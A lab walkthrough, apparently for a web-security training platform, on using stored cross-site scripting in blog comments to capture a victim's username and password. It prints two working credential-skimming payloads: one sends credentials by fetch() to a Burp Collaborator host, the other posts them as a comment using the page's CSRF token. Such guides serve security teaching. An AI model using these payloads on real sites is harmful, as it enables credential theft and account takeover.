# Lab Guide: Exploiting Cross-Site Scripting to Capture Passwords

This guide shows how to exploit a **Cross-Site Scripting (XSS)** vulnerability to capture a victim’s username and password using **Burp Suite Professional**. You’ll use the Burp Collaborator to collect credentials stealthily. Let’s dive in!

---

## Objective
Exploit an XSS vulnerability in a blog comment system to capture a victim’s login credentials and send them to a Burp Collaborator server, then use the credentials to log in as the victim.

---

## Tools Needed
- **Burp Suite Professional** (with Burp’s browser and Collaborator)
- Basic understanding of XSS, HTTP requests, and form manipulation

---

## Step-by-Step Instructions

### 1- Set Up Burp Collaborator
- Open **Burp Suite Professional** and navigate to the **Collaborator** tab.
- Click **Copy to clipboard** to copy a unique **Burp collaborator subdomain** (e.g., `xyz.burpcollaborator.net`).

### 2- Craft the XSS Payload
- In **Burp’s browser**, navigate to a blog post (e.g., `https://YOUR-LAB-ID.web-security-academy.net/post?postId=3`) and access the comment submission form.
- Submit the following XSS payload in the comment field, replacing `BURP-COLLABORATOR-SUBDOMAIN` with your copied subdomain:
  ```html
  <input name=username id=username>
  <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
      method:'POST',
      mode: 'no-cors',
      body:username.value+':'+this.value
  });">
  ```
- **Note**: This payload creates fake login fields that capture the victim’s username and password, sending them to the Collaborator server when the password field changes.

### 3- Capture the Victim’s Credentials
- Return to the **Collaborator** tab in Burp Suite and click **Poll now**.
- Wait a few seconds and check for an HTTP interaction. If none appears, poll again.
- **Observation**: The POST body contains the victim’s credentials (e.g., `administrator:kcrzjaueycdnb6vt2zm3`).

### 4- Log In as the Victim
- Use the captured credentials (e.g., username: `administrator`, password: `kcrzjaueycdnb6vt2zm3`) to log in via the login page (e.g., `https://YOUR-LAB-ID.web-security-academy.net/login`).
- **Observation**: Successful login confirms the credentials are valid, solving the lab.

### 5- Alternative Approach (Less Subtle)
- Instead of using Burp Collaborator, you could post the credentials as a blog comment:
  ```html
  <input type="text" name="username" id="username">
  <input type="password" name="password" onchange="
      if (this.value) {
          var token = document.getElementsByName('csrf')[0].value;
          var data = new FormData();
          data.append('csrf', token);
          data.append('postId', 3);
          data.append('comment', 'mohamedUsername=' + document.getElementById('username').value + '&mohamedPassword=' + this.value);
          data.append('name', 'victim');
          data.append('email', 'mohamed@gmail.com');
          data.append('website', 'https://mohamed.com');
          fetch('/post/comment', {
              method: 'POST',
              mode: 'no-cors',
              body: data
          });
      }
  ">
  ```
  